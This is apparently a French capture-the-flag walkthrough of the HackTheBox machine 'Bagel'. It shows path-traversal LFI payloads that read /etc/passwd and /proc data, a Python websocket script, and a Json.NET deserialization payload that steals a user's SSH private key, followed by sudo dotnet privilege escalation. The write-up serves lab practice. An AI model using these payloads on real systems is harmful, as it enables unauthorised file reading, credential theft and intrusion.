# Bagel - Medium

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-28 19:46 EST                                
Nmap scan report for 10.10.11.201                                                                                                                                                             
Host is up (0.020s latency).                                                                   
Not shown: 997 closed tcp ports (conn-refused)                                                 
PORT     STATE SERVICE  VERSION                                                                
22/tcp   open  ssh      OpenSSH 8.8 (protocol 2.0)                                             
| ssh-hostkey:                                                                                                                                                                                
|   256 6e:4e:13:41:f2:fe:d9:e0:f7:27:5b:ed:ed:cc:68:c2 (ECDSA)                                
|_  256 80:a7:cd:10:e7:2f:db:95:8b:86:9b:1b:20:65:2a:98 (ED25519)                              
5000/tcp open  upnp?
8000/tcp open  http-alt Werkzeug/2.2.2 Python/3.10.9
```

On n’arrive pas à acceder au port 5000 via https mais le script nmap nous dévoile le nom de domaine bagel.htb au port 8000 que l’on rajoute à notre /etc/hosts. On atterit alors sur un site. On lance un gobuster en fond. On remarque l’url de l’index qui est bizarre:

```bash
http://bagel.htb:8000/?page=index.html
```

On pense donc à une LFI:

```bash
http://bagel.htb:8000/?page=../../../../../../../../etc/passwd
```

On obtient le /etc/passwd et on sait que il y a ces comptes: phil et developer

Il faut maintenant trouver des fichiers intéressants dans leur /home avec gobuster

```bash
http://bagel.htb:8000/?page=../../../../../../../../home/developer/

/.bash_profile        (Status: 200) [Size: 141]
/.bashrc              (Status: 200) [Size: 492]
/.bash_logout         (Status: 200) [Size: 18]
```

On va télécharger un fichier spécial pour ça: [https://github.com/MrW0l05zyn/pentesting/blob/master/web/payloads/lfi-rfi/lfi-linux-list.txt](https://github.com/MrW0l05zyn/pentesting/blob/master/web/payloads/lfi-rfi/lfi-linux-list.txt)

Voici ce que l’on trouve: 

```bash
//etc/bluetooth/main.conf (Status: 200) [Size: 11118]   
//etc/crontab         (Status: 200) [Size: 451]         
//etc/crypttab        (Status: 500) [Size: 265]         
//etc/default/grub    (Status: 200) [Size: 381]         
//etc/exports         (Status: 200) [Size: 0]            
//etc/fedora-release  (Status: 200) [Size: 31]           
//etc/fstab           (Status: 200) [Size: 570]          
//etc/fuse.conf       (Status: 200) [Size: 38]           
//etc/group           (Status: 200) [Size: 761]                    
//etc/group-          (Status: 200) [Size: 746]                     
//etc/host.conf       (Status: 200) [Size: 9]                       
//etc/hostname        (Status: 200) [Size: 6]                      
//etc/hosts           (Status: 200) [Size: 392]                    
//etc/inittab         (Status: 200) [Size: 490]                     
//etc/issue           (Status: 200) [Size: 28]                      
//etc/issue.net       (Status: 200) [Size: 27]                      
//etc/ld.so.conf      (Status: 200) [Size: 28]                      
//etc/login.defs      (Status: 200) [Size: 8676]                    
//etc/logrotate.conf  (Status: 200) [Size: 493]                    
//etc/motd            (Status: 200) [Size: 0]                      
//etc/mtab            (Status: 200) [Size: 1758]                    
//etc/mtools.conf     (Status: 200) [Size: 2620]                   
//etc/networks        (Status: 200) [Size: 58]                      
//etc/openldap/ldap.conf (Status: 200) [Size: 900]                  
//etc/os-release      (Status: 200) [Size: 761]                     
//etc/passwd-         (Status: 200) [Size: 1777]               
//etc/passwd          (Status: 200) [Size: 1823]     
//etc/profile         (Status: 200) [Size: 1945]
//etc/redhat-release  (Status: 200) [Size: 31]       
//etc/resolv.conf     (Status: 200) [Size: 920]      
//etc/samba/smb.conf  (Status: 200) [Size: 853]      
//etc/security/access.conf (Status: 200) [Size: 4564]
//etc/security/group.conf (Status: 200) [Size: 3635] 
//etc/security/limits.conf (Status: 200) [Size: 2426]
//etc/security/namespace.conf (Status: 200) [Size: 1637]
//etc/security/opasswd (Status: 500) [Size: 265]        
//etc/security/pam_env.conf (Status: 200) [Size: 2971]  
//etc/security/sepermit.conf (Status: 200) [Size: 418]  
//etc/security/time.conf (Status: 200) [Size: 2179]     
//etc/shadow-         (Status: 500) [Size: 265]         
//etc/shadow          (Status: 500) [Size: 265]         
//etc/ssh/sshd_config (Status: 500) [Size: 265]         
//etc/sudoers         (Status: 500) [Size: 265]         
//etc/sysconfig/network-scripts/ifcfg-eth0 (Status: 200) [Size: 67]
//etc/sysctl.conf     (Status: 200) [Size: 523]                    
//etc/updatedb.conf   (Status: 200) [Size: 513]                    
//proc/cpuinfo        (Status: 200) [Size: 2210]                   
//proc/meminfo        (Status: 200) [Size: 1559]                   
//proc/devices        (Status: 200) [Size: 569]                    
//proc/net/udp        (Status: 200) [Size: 640]                    
//proc/self/environ   (Status: 200) [Size: 233]                    
//proc/self/cmdline   (Status: 200) [Size: 35]                     
//proc/self/stat      (Status: 200) [Size: 314]                    
//proc/self/mounts    (Status: 200) [Size: 1758]                   
//proc/self/status    (Status: 200) [Size: 1407]                   
//proc/version        (Status: 200) [Size: 210]                    
//proc/net/tcp        (Status: 200) [Size: 182850]                 
//var/log/boot.log    (Status: 500) [Size: 265]                    
//var/log/messages    (Status: 500) [Size: 265]
```

Dans /proc/self/cmdline on trouve ceci:

```bash
python3/home/developer/app/app.py
```

On va donc télécharger cette application, ce script permet de se connecter sur le port 5000. On peut modifier le fichier pour essayer de se connecter à distance mais il y a ceci dans le fichier:

```bash
# don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.
```

Pour trouver ce DLL on peut utiliser cette astuce pour avoir la ligne de commande qui a lancé le process -o- est pour écrire dans stdout

```bash
/etc/$pid/cmdline
```

```bash
for i in {800..1000}; do curl http://bagel.htb:8000/?page=../../../../../../proc/$i/cmdline -o-; echo " | $i";done
```

On trouve ceci:

```bash
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll | 935
```

On télécharge alors le fichier et il faut pouvoir l’ouvrir, on utilise ILSpy parce que c’est son usage

[https://github.com/icsharpcode/AvaloniaILSpy/releases/tag/v7.2-rc](https://github.com/icsharpcode/AvaloniaILSpy/releases/tag/v7.2-rc)

On trouve dans DB le mdp pour dev mais pas possible d’ssh directement alors il faudra passer par phil. On va donc créer notre propre script python en copiant celui de app.py pour se connecter à la DB:

```python
import websocket,json

ws = websocket.WebSocket()    
ws.connect("ws://10.10.11.201:5000/") # connect to order app
order = {"ReadOrder":"orders.txt"}
data = str(json.dumps(order))
ws.send(data)
result = ws.recv()
print(json.loads(result)['ReadOrder'])
```

On le teste:

```python
python3 exploit.py 

order #1 address: NY. 99 Wall St., client name: P.Morgan, details: [20 chocko-bagels]
order #2 address: Berlin. 339 Landsberger.A., client name: J.Smith, details: [50 bagels]
order #3 address: Warsaw. 437 Radomska., client name: A.Kowalska, details: [93 bel-bagels]
```

Le problème est qu’avec ReadOrder les “/” et “..” sont enlevés, on le voit dans le code du .dll

On voit que RemoveOrder n’est pas protégé par la même chose alors on va essayer d’utiliser la désérialisation json:

```
In many occasions you can find some code in the server side that unserialize some object given by the user.
In this case, you can send a malicious payload to make the server side behave unexpectedly.
```

Il y a bien une vulnérabilité car TypeNameHandling est à 4 alors qu’il faut qu’il soit à 0 pour être safe. Le payload devient donc:

```json
order = {"RemoveOrder":{"type":"bagel_server.file","ReadOrder":"../../../../../etc/passwd"}}
```

On obtient le /etc/passwd dans la réponse puisque dans le code du .dll on voit bien que cette méthode retourne la requête (d’ou la désérialisation)

On peut donc essayer de chopper un clé privée de phil:

```json
order = {"RemoveOrder":{"type":"bagel_server.file","ReadOrder":"../../../../../home/phil/.ssh/id_rsa"}}
```

Il ne faut pas oublier de chmod 600. On est connecté en tant que phil et on peut direct ssh en tant que dev vu qu’on avait récupéré le mdp.

```bash
sudo -l

User developer may run the following commands on bagel:
    (root) NOPASSWD: /usr/bin/dotnet
```

[https://gtfobins.github.io/gtfobins/dotnet/](https://gtfobins.github.io/gtfobins/dotnet/)

On lit le flag root